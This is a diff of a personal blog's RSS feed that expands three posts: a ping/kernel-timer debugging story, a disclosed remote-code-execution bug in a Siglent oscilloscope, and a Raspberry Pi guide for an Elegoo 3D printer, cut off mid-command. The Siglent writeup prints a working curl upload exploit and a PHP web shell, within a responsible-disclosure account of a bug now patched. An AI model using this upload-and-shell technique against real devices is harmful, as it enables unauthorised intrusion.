@@ -1,2 +1,180 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on l9o.dev</title><link>https://l9o.dev/posts/</link><description>Recent content in Posts on l9o.dev</description><generator>Hugo</generator><language>en-us</language><lastBuildDate>Fri, 26 Dec 2025 00:00:00 -0500</lastBuildDate><atom:link href="https://l9o.dev/posts/index.xml" rel="self" type="application/rss+xml"/><item><title>Thou shall only ping once</title><link>https://l9o.dev/posts/thou-shall-only-ping-once/</link><pubDate>Fri, 26 Dec 2025 00:00:00 -0500</pubDate><guid>https://l9o.dev/posts/thou-shall-only-ping-once/</guid><description>&lt;p&gt;I&amp;rsquo;ve been working on a cross-platform VMM library. Part of that involves a userspace NAT implementation that lets guest VMs access the network without requiring root privileges or TUN/TAP devices. Running the network stack in userspace also lets us enforce network policies on the guest, restricting which hosts and ports it can access.&lt;/p&gt;
-&lt;p&gt;We have integration tests that boot minimal Linux VMs and run commands via the console. One of those tests pings the gateway to verify networking works. It was using &lt;code&gt;ping -c 1&lt;/code&gt; with a FIXME: &amp;ldquo;&lt;em&gt;Using -c 1 because -c 3 or higher causes the test to hang.&lt;/em&gt;&amp;rdquo; I decided to figure out why.&lt;/p&gt;</description></item><item><title>Remote Code Execution on the Siglent SDS1104X-E</title><link>https://l9o.dev/posts/remote-code-execution-on-the-siglent-sds1104x-e/</link><pubDate>Tue, 23 Dec 2025 00:00:00 -0500</pubDate><guid>https://l9o.dev/posts/remote-code-execution-on-the-siglent-sds1104x-e/</guid><description>&lt;p&gt;Back in 2021, I found an unrestricted file upload vulnerability on my Siglent SDS1104X-E oscilloscope that could be escalated to remote code execution. This is a writeup of that bug.&lt;/p&gt;</description></item><item><title>Controlling an Elegoo Mars Pro remotely</title><link>https://l9o.dev/posts/controlling-an-elegoo-mars-pro-remotely/</link><pubDate>Sun, 18 Oct 2020 17:25:33 -0400</pubDate><guid>https://l9o.dev/posts/controlling-an-elegoo-mars-pro-remotely/</guid><description>&lt;p&gt;One of the main things I missed on my Elegoo Mars Pro 3D Printer was remote access over WiFi. I wanted to upload files, print and keep track of print status while I’m away from the printer. Luckily, the Elegoo Mars Pro exposes a serial port on some of its motherboard pins, allowing for it to be controlled with a Raspberry Pi Zero W. I wrote a software called &lt;a href="https://github.com/luizribeiro/mariner"&gt;mariner&lt;/a&gt; for controlling it over HTTP and here I document my current setup.&lt;/p&gt;</description></item></channel></rss>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on l9o.dev</title><link>https://l9o.dev/posts/</link><description>Recent content in Posts on l9o.dev</description><generator>Hugo</generator><language>en-US</language><lastBuildDate>Fri, 26 Dec 2025 00:00:00 -0500</lastBuildDate><atom:link href="https://l9o.dev/posts/index.xml" rel="self" type="application/rss+xml"/><item><title>Thou shall only ping once</title><link>https://l9o.dev/posts/thou-shall-only-ping-once/</link><pubDate>Fri, 26 Dec 2025 00:00:00 -0500</pubDate><guid>https://l9o.dev/posts/thou-shall-only-ping-once/</guid><description>&lt;p&gt;I&amp;rsquo;ve been working on a cross-platform VMM library. Part of that involves a userspace NAT implementation that lets guest VMs access the network without requiring root privileges or TUN/TAP devices. Running the network stack in userspace also lets us enforce network policies on the guest, restricting which hosts and ports it can access.&lt;/p&gt;
+&lt;p&gt;We have integration tests that boot minimal Linux VMs and run commands via the console. One of those tests pings the gateway to verify networking works. It was using &lt;code&gt;ping -c 1&lt;/code&gt; with a FIXME: &amp;ldquo;&lt;em&gt;Using -c 1 because -c 3 or higher causes the test to hang.&lt;/em&gt;&amp;rdquo; I decided to figure out why.&lt;/p&gt;
+&lt;h2 id="symptoms"&gt;Symptoms&lt;/h2&gt;
+&lt;p&gt;&lt;code&gt;ping -c 1 10.0.2.2&lt;/code&gt; works fine. The reply comes back, ping exits, test passes.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;ping -c 2 10.0.2.2&lt;/code&gt; sends the first ping, receives the reply, then&amp;hellip; nothing. The VM just sits there. No second ping is ever sent. No timeout. The process appears frozen.&lt;/p&gt;
+&lt;p&gt;This affected both pings to the gateway (handled by smoltcp) and pings to external hosts (routed through ICMP NAT). Same behavior for both.&lt;/p&gt;
+&lt;h2 id="down-the-wrong-path"&gt;Down the wrong path&lt;/h2&gt;
+&lt;p&gt;My first instinct was that something was wrong with our networking code. I added debug logging everywhere. ICMP echo replies were being received and delivered to the guest. The network stack was doing its job.&lt;/p&gt;
+&lt;p&gt;But after that first reply, the guest simply stopped sending packets.&lt;/p&gt;
+&lt;h2 id="diving-into-busybox"&gt;Diving into busybox&lt;/h2&gt;
+&lt;p&gt;I was using &lt;a href="https://claude.com/product/claude-code"&gt;Claude Code&lt;/a&gt; to help debug this. At some point I asked it to investigate how busybox&amp;rsquo;s ping works. It spawned a subagent to research the source code and came back with a report.&lt;/p&gt;
+&lt;p&gt;The key finding: busybox ping uses &lt;code&gt;alarm()&lt;/code&gt; to schedule subsequent pings. After receiving a reply, it calls &lt;code&gt;alarm(1)&lt;/code&gt; to fire a SIGALRM in one second, then blocks on &lt;code&gt;recvfrom()&lt;/code&gt;. When the signal fires, &lt;code&gt;recvfrom()&lt;/code&gt; returns with EINTR and ping sends the next packet.&lt;/p&gt;
+&lt;p&gt;If &lt;code&gt;alarm()&lt;/code&gt; isn&amp;rsquo;t working, ping blocks forever.&lt;/p&gt;
+&lt;h2 id="testing-our-hypothesis"&gt;Testing our hypothesis&lt;/h2&gt;
+&lt;p&gt;To confirm, I ran this inside the VM:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-sh" data-lang="sh"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;ping -c &lt;span class="m"&gt;2&lt;/span&gt; 10.0.2.2 &lt;span class="p"&gt;&amp;amp;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;sleep &lt;span class="m"&gt;2&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nb"&gt;kill&lt;/span&gt; -ALRM &lt;span class="nv"&gt;$!&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Both pings completed. The first ping goes out immediately, then ping blocks on &lt;code&gt;recvfrom()&lt;/code&gt; waiting for either a reply or a signal. The manual SIGALRM interrupts the syscall, triggering the second ping. Signal delivery worked fine, but &lt;code&gt;alarm()&lt;/code&gt; wasn&amp;rsquo;t scheduling it.&lt;/p&gt;
+&lt;h2 id="root-cause"&gt;Root cause&lt;/h2&gt;
+&lt;p&gt;I asked Claude Code whether &lt;code&gt;tinyconfig&lt;/code&gt; would support &lt;code&gt;alarm()&lt;/code&gt;. After investigating, it found we were missing timer support.&lt;/p&gt;
+&lt;p&gt;Our test VMs use minimal Linux kernels built from &lt;code&gt;tinyconfig&lt;/code&gt;. Turns out it doesn&amp;rsquo;t include timers by default:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-nix" data-lang="nix"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;TICK_ONESHOT&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="no"&gt;true&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;HIGH_RES_TIMERS&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="no"&gt;true&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;POSIX_TIMERS&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="no"&gt;true&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;ARM_ARCH_TIMER&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="no"&gt;true&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="c1"&gt;# ARM64 only&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Without these, &lt;code&gt;alarm()&lt;/code&gt; accepts the syscall but never fires the signal. Four lines of config, and &lt;code&gt;ping -c 3&lt;/code&gt; works.&lt;/p&gt;
+&lt;h2 id="lessons-learned"&gt;Lessons learned&lt;/h2&gt;
+&lt;p&gt;&lt;strong&gt;AI is good at the tedious research you&amp;rsquo;d skip.&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;The breakthrough came from a subagent reading busybox&amp;rsquo;s ping implementation. I wouldn&amp;rsquo;t have done that manually. I&amp;rsquo;d have kept staring at my own code. Having Claude Code go off, study the source, and come back with &amp;ldquo;it uses &lt;code&gt;alarm()&lt;/code&gt; to schedule pings&amp;rdquo; was the turning point.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Fresh sessions can act as a second pair of eyes.&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;I also asked a separate Claude Code instance for ideas. Without our debugging context, it approached the problem differently and suggested things like PID 1 signal semantics and SA_RESTART behavior. Sometimes missing context is a feature.&lt;/p&gt;
+&lt;p&gt;Three hours of debugging. Four lines of config.&lt;/p&gt;</description></item><item><title>Remote Code Execution on the Siglent SDS1104X-E</title><link>https://l9o.dev/posts/remote-code-execution-on-the-siglent-sds1104x-e/</link><pubDate>Tue, 23 Dec 2025 00:00:00 -0500</pubDate><guid>https://l9o.dev/posts/remote-code-execution-on-the-siglent-sds1104x-e/</guid><description>&lt;p&gt;Back in 2021, I found an unrestricted file upload vulnerability on my Siglent SDS1104X-E oscilloscope that could be escalated to remote code execution. This is a writeup of that bug.&lt;/p&gt;
+&lt;h2 id="the-vulnerability"&gt;The vulnerability&lt;/h2&gt;
+&lt;p&gt;The SDS1104X-E ran a web interface that let you interact with the oscilloscope over the network. One of the endpoints, &lt;code&gt;/deviceupdate.php&lt;/code&gt;, was meant for firmware updates but didn&amp;rsquo;t validate the uploaded file type or restrict where uploaded files ended up.&lt;/p&gt;
+&lt;p&gt;The exploit was trivial:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;curl -X POST &lt;span class="se"&gt;\
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; -F &lt;span class="s1"&gt;&amp;#39;in_device_version=@./test.php&amp;#39;&lt;/span&gt; &lt;span class="se"&gt;\
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; --header &lt;span class="s2"&gt;&amp;#34;Expect: &amp;#34;&lt;/span&gt; &lt;span class="se"&gt;\
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; http://&amp;lt;scope-ip&amp;gt;/deviceupdate.php
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This uploaded any file to &lt;code&gt;/web_img/&lt;/code&gt; on the oscilloscope. Since the device ran PHP, you could execute the uploaded file by simply visiting:&lt;/p&gt;
+&lt;pre tabindex="0"&gt;&lt;code&gt;http://&amp;lt;scope-ip&amp;gt;/web_img/test.php
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;With a &lt;code&gt;test.php&lt;/code&gt; like:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;&amp;lt;?&lt;/span&gt;&lt;span class="nx"&gt;php&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nx"&gt;system&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_GET&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;cmd&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;&lt;span class="err"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;You now had a shell on the oscilloscope. This bypassed any password protection on the device. From there, you could move laterally (enabling SSH, for example) and persist on the device.&lt;/p&gt;
+&lt;h2 id="impact"&gt;Impact&lt;/h2&gt;
+&lt;p&gt;Realistically, most people don&amp;rsquo;t leave their oscilloscope exposed on an untrusted network. But you do occasionally find them open to the web on improperly configured networks. And if you&amp;rsquo;re on a shared lab network or someone has network access to your equipment, they could run arbitrary code on your scope.&lt;/p&gt;
+&lt;h2 id="responsible-disclosure"&gt;Responsible disclosure&lt;/h2&gt;
+&lt;p&gt;I reported this to Siglent on February 14, 2021. They were responsive. Their team got back to me within a week and relayed the bug report to their engineering team.&lt;/p&gt;
+&lt;p&gt;I recommended two mitigations: restricting uploads to &lt;code&gt;.ADS&lt;/code&gt; files only (the firmware update format), and moving uploaded files to a directory that isn&amp;rsquo;t web-accessible. That way, even if someone bypassed the file type restriction, they wouldn&amp;rsquo;t be able to execute the uploaded file.&lt;/p&gt;
+&lt;p&gt;They estimated about 2 months for a firmware release since they had other issues to address. I agreed to wait for the fix before publishing anything.&lt;/p&gt;
+&lt;h2 id="bonus-bug-fix-wifi-ssids-with-spaces"&gt;Bonus bug fix: WiFi SSIDs with spaces&lt;/h2&gt;
+&lt;p&gt;This was the whole reason I was poking around in the first place. My WiFi network has spaces in its SSID, and my oscilloscope wouldn&amp;rsquo;t connect to it. This was a &lt;a href="https://www.eevblog.com/forum/testgear/wifi-siglent-sds1104x-e-workaround-ssidpsk-with-spaces-and-special-characters/"&gt;known issue on the EEVBlog forums&lt;/a&gt;, but nobody had figured out the root cause. I wanted to debug it, so I started looking for a way into the device.&lt;/p&gt;
+&lt;p&gt;Once I had shell access, I found the problem. The device used &lt;code&gt;wpa_passphrase&lt;/code&gt; to generate the &lt;code&gt;wpa_supplicant.conf&lt;/code&gt; file but didn&amp;rsquo;t escape the SSID or passphrase. So instead of:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;wpa_passphrase &lt;span class="s2"&gt;&amp;#34;My Network&amp;#34;&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;hunter2&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;It ran:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;wpa_passphrase My Network hunter2
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This set the SSID to &amp;ldquo;My&amp;rdquo; and the key to &amp;ldquo;Network&amp;rdquo;. Classic shell escaping bug. I passed this along to Siglent as well.&lt;/p&gt;
+&lt;p&gt;The good news: Siglent fixed this too! Firmware 6.1.37R2 (released August 24, 2021) added support for special characters in SSIDs and passwords.&lt;/p&gt;
+&lt;h2 id="timeline"&gt;Timeline&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Feb 14, 2021&lt;/strong&gt;: Reported vulnerability via Siglent contact form&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Feb 22, 2021&lt;/strong&gt;: Siglent acknowledged and asked me to hold off on disclosure&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Feb 23, 2021&lt;/strong&gt;: Discussed mitigations with their R&amp;amp;D team&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Aug 24, 2021&lt;/strong&gt;: &lt;a href="https://siglentna.com/service-and-support/firmware-software/digital-oscilloscopes/"&gt;Firmware 6.1.37R2&lt;/a&gt; released with fixes&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Dec 23, 2025&lt;/strong&gt;: Public disclosure&lt;/li&gt;
+&lt;/ul&gt;</description></item><item><title>Controlling an Elegoo Mars Pro remotely</title><link>https://l9o.dev/posts/controlling-an-elegoo-mars-pro-remotely/</link><pubDate>Sun, 18 Oct 2020 17:25:33 -0400</pubDate><guid>https://l9o.dev/posts/controlling-an-elegoo-mars-pro-remotely/</guid><description>&lt;p&gt;One of the main things I missed on my Elegoo Mars Pro 3D Printer was remote access over WiFi. I wanted to upload files, print and keep track of print status while I’m away from the printer. Luckily, the Elegoo Mars Pro exposes a serial port on some of its motherboard pins, allowing for it to be controlled with a Raspberry Pi Zero W. I wrote a software called &lt;a href="https://github.com/luizribeiro/mariner"&gt;mariner&lt;/a&gt; for controlling it over HTTP and here I document my current setup.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;em&gt;Disclaimer:&lt;/em&gt; this software and instructions are provided &amp;ldquo;as is&amp;rdquo;, without warranty of any kind. There is no guarantee this will work on your printer, nor that it won’t damage it. Do and use it at your own risk. You should also keep the software behind a firewall. If you need authentication you should set it up with a reverse proxy, as there is no support for authentication on &lt;code&gt;mariner&lt;/code&gt;.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h2 id="what-it-looks-like"&gt;What it looks like&lt;/h2&gt;
+&lt;p&gt;As of this writing, &lt;a href="https://github.com/luizribeiro/mariner"&gt;mariner&lt;/a&gt; supports desktop and mobile browsers and can:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Upload files to be printed.&lt;/li&gt;
+&lt;li&gt;Check print status: progress, current layer, time left, etc.&lt;/li&gt;
+&lt;li&gt;Control the printer: start prints, pause/resume and stop.&lt;/li&gt;
+&lt;li&gt;Browse files available for printing.&lt;/li&gt;
+&lt;li&gt;Inspect &lt;code&gt;.ctb&lt;/code&gt; files: image preview, print time and basic slicing settings.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;This is what the interface looks like while printing something:&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://l9o.dev/img/screenshot.png" alt=""&gt;&lt;/p&gt;
+&lt;p&gt;The Elegoo Mars Pro has a lot of room inside, so I was able to put all the required components inside the case. The printer itself looks like a standard Elegoo Mars Pro, but with remote access over WiFi!&lt;/p&gt;
+&lt;p&gt;Once you do this mod, the external USB port of your printer won’t be usable since the port will be used by the Raspberry Pi (it is a reversible process though).&lt;/p&gt;
+&lt;h2 id="parts-list"&gt;Parts List&lt;/h2&gt;
+&lt;p&gt;In order to do this mod, you will need:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;Raspberry Pi Zero W&lt;/strong&gt;: …obviously. [&lt;a href="https://www.adafruit.com/product/3400"&gt;Adafruit&lt;/a&gt;]&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Micro SD Card:&lt;/strong&gt; for the Pi. I use a 32GB SanDisk Ultra microSDHC UHS-I card. But even a 8GB card should be sufficient.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Micro USB to USB-A cable:&lt;/strong&gt; to connect the Pi to the printer motherboard. You probably have plenty of these.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Some Male Pin Headers:&lt;/strong&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;2x20 male headers:&lt;/strong&gt; which will be soldered to the Pi (if you don’t have one on your Pi already yet). [&lt;a href="https://www.adafruit.com/product/2822"&gt;Adafruit&lt;/a&gt;]&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;1x3 male headers:&lt;/strong&gt; just buy any size and break them. You will only need 3 pins (these will go on the printers’ motherboard). [&lt;a href="https://www.adafruit.com/product/4173"&gt;Adafruit&lt;/a&gt;]&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Some Jumper Wires:&lt;/strong&gt; for connecting the motherboard’s serial port to the Pi. [&lt;a href="https://www.adafruit.com/product/1951"&gt;Adafruit&lt;/a&gt;]&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Some Heatshrink:&lt;/strong&gt; optional, but always good to keep things organized. [&lt;a href="https://www.adafruit.com/product/1649"&gt;Adafruit&lt;/a&gt;]&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Power Supply for the Pi:&lt;/strong&gt; there’s two options here:
+&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;External Power Supply:&lt;/strong&gt; You can use your Pi Power Supply as usual and leave a cable going out from the back of the printer.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Use the Printer’s Power Supply:&lt;/strong&gt; this leaves you with a clean build, since there’s no cables from the back of the printer. You can use a 12V to 5V DC buck converter module. The 12V line of the printer is easily accessible from the 12V connector on the motherboard. I used this converter module [&lt;a href="https://www.amazon.com/gp/product/B00CBCGAL8/ref=ppx_yo_dt_b_asin_title_o02_s00?ie=UTF8&amp;amp;psc=1"&gt;Amazon&lt;/a&gt;], which required me to salvage an old Micro USB cable and solder it to the buck converter. There are other buck converters which come with a Micro USB cable on them [&lt;a href="https://www.amazon.com/SMAKN%C2%AE-Converter-Supply-Module-OUTPUT/dp/B00R5JL8WI?pd_rd_w=On6F5&amp;amp;pf_rd_p=58f68c27-9bf4-466f-b1c8-101a062bcc82&amp;amp;pf_rd_r=MVFH5FSSGK5HJ4AAFP7S&amp;amp;pd_rd_r=8990a100-8b65-4cf1-b902-0654ed09a4e9&amp;amp;pd_rd_wg=pZe4a"&gt;Amazon&lt;/a&gt;] which should work, but I haven’t tested those myself.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id="preparing-the-printer"&gt;Preparing the printer&lt;/h2&gt;
+&lt;p&gt;Elegoo has a good video on how to replace the printer’s motherboard, so I won’t get into details about how to disassemble the printer and remove the motherboard. You can watch &lt;a href="https://www.youtube.com/watch?v=nifBZ5Mh2Rg"&gt;this video on YouTube&lt;/a&gt; for details on that.&lt;/p&gt;
+&lt;p&gt;This is what my printer looked like inside:&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://l9o.dev/img/UNADJUSTEDNONRAW_thumb_eab.jpg" alt=""&gt;&lt;/p&gt;
+&lt;p&gt;Once you remove the motherboard from the printer, you can see there are pins exposing the serial port right in the middle of the board. Look for the pins labeled GND, RX, TX. You will have to solder male pin headers to those:&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://l9o.dev/img/IMG_0672.jpeg" alt=""&gt;&lt;/p&gt;
+&lt;p&gt;Note that you don’t want to connect the 5V line, so you don’t need to solder a header to it. Just GND, RX and TX. Once you have those three pins soldered, plug the jumper wires to the pins you just soldered and put the motherboard back into the printer (it’s harder to plug the jumper wires in once you have placed the motherboard back into the printer):&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://l9o.dev/img/IMG_0674.jpeg" alt=""&gt;&lt;/p&gt;
+&lt;h2 id="preparing-the-raspberry-pi-zero-w"&gt;Preparing the Raspberry Pi Zero W&lt;/h2&gt;
+&lt;p&gt;If you don’t have a male pin header on your Pi, first solder them in.&lt;/p&gt;
+&lt;h3 id="connecting-the-pi-to-the-printers-serial-port"&gt;Connecting the Pi to the printer’s serial port&lt;/h3&gt;
+&lt;p&gt;You should connect the wires from the motherboard to your Pi like this:&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://l9o.dev/img/schematic.png" alt=""&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href="https://pinout.xyz/"&gt;pinout.xyz&lt;/a&gt; is a good reference if you’re unfamiliar with the Raspberry Pi’s GPIO pins. Note that the Pi’s TX pin is connected to the motherboard’s RX pin and vice-versa.&lt;/p&gt;
+&lt;h3 id="connecting-the-pi-to-the-printers-usb-port"&gt;Connecting the Pi to the printer’s USB port&lt;/h3&gt;
+&lt;p&gt;Note that the Pi has two USB connectors: the PWR IN one should be connected to your power source (again, this could be a buck converter from the printer’s 12V or an external power source).&lt;/p&gt;
+&lt;p&gt;The other port will be connected to the &amp;ldquo;USB Disk&amp;rdquo; USB port on the printer’s motherboard. This is what will allow the printer to see the files uploaded to your Pi.&lt;/p&gt;
+&lt;p&gt;Note that this USB port on the Pi is connected directly to the Pi’s 5V line. You don’t want to have that connected directly to the printer’s 5V line, otherwise you run into issues where the Pi ends up powering the printer’s motherboard (a well-known problem between Octoprint users). So you need to do one of these:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Put some tape on the 5V line of your USB cable. &lt;a href="https://community.octoprint.org/t/put-tape-on-the-5v-pin-why-and-how/13574"&gt;This tutorial&lt;/a&gt; is a good reference on how to do this.&lt;/li&gt;
+&lt;li&gt;Cut the connection between the 5V line and the USB port on the Pi. Some people online do this, but I didn’t want to do any permanent changes to my Pi.&lt;/li&gt;
+&lt;li&gt;Use a &lt;a href="https://www.tindie.com/products/brianlough/power-blough-r/"&gt;Power BLough-R&lt;/a&gt;. I actually got one of these but I couldn’t make it fit inside the case of the printer easily, so I just used the tape method.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id="wrapping-up-the-hardware"&gt;Wrapping up the hardware&lt;/h2&gt;
+&lt;p&gt;This is what my finalized build looks like:&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://l9o.dev/img/IMG_0676.jpeg" alt=""&gt;&lt;/p&gt;
+&lt;p&gt;I recommend you to setup the software and make sure things work before putting everything inside the printer and closing the case.&lt;/p&gt;
+&lt;h2 id="setting-up-the-software"&gt;Setting up the software&lt;/h2&gt;
+&lt;p&gt;All the hardware should be done by now, so it’s time to setup the software!&lt;/p&gt;
+&lt;p&gt;Start by setting up Raspberry Pi OS on the SD card. Make sure to enable SSH access and setup a 2.4GHz WiFi connection, as we will be using this Pi in headless mode. There are plenty of tutorials on this online,[&lt;a href="https://learn.adafruit.com/raspberry-pi-zero-creation"&gt;1&lt;/a&gt;][&lt;a href="https://www.raspberrypi.org/documentation/configuration/wireless/headless.md"&gt;2&lt;/a&gt;][&lt;a href="https://medium.com/@jay_proulx/headless-raspberry-pi-zero-w-setup-with-ssh-and-wi-fi-8ddd8c4d2742"&gt;3&lt;/a&gt;] so I won’t get into those details.&lt;/p&gt;
+&lt;p&gt;Everything after this point assumes you have a working Raspberry Pi OS install with SSH access over WiFi.&lt;/p&gt;
+&lt;h3 id="install-mariner3d"&gt;Install mariner3d&lt;/h3&gt;
+&lt;p&gt;Once you’re connected to your Pi through SSH, enable my PPA repository:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;$ curl -sL gpg.l9o.dev &lt;span class="p"&gt;|&lt;/span&gt; sudo apt-key add -
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;$ &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;deb https://ppa.l9o.dev/raspbian ./&amp;#34;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; sudo tee /etc/apt/sources.list.d/l9o.list
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;$ sudo apt update
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Then install the &lt;code&gt;mariner3d&lt;/code&gt; package:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;$ sudo apt install mariner3d
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id="allow-the-printer-to-see-files-on-the-pi"&gt;Allow the printer to see files on the Pi&lt;/h3&gt;
+&lt;p&gt;&lt;code&gt;mariner&lt;/code&gt; lets the printer access its own files by using &lt;a href="https://www.kernel.org/doc/html/v4.13/driver-api/usb/gadget.html"&gt;Linux’s USB Gadget system&lt;/a&gt;, allowing it to act as a mass storage device.&lt;/p&gt;
+&lt;p&gt;To get this to work, first enable the USB driver for gadget modules by adding this line to &lt;code&gt;/boot/config.txt&lt;/code&gt;:&lt;/p&gt;
+&lt;pre tabindex="0"&gt;&lt;code&gt;dtoverlay=dwc2
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Enable the &lt;code&gt;dwc2&lt;/code&gt; kernel module, by adding this to your &lt;code&gt;/boot/cmdline.txt&lt;/code&gt; just after &lt;code&gt;rootwait&lt;/code&gt;:&lt;/p&gt;
+&lt;pre tabindex="0"&gt;&lt;code&gt;modules-load=dwc2
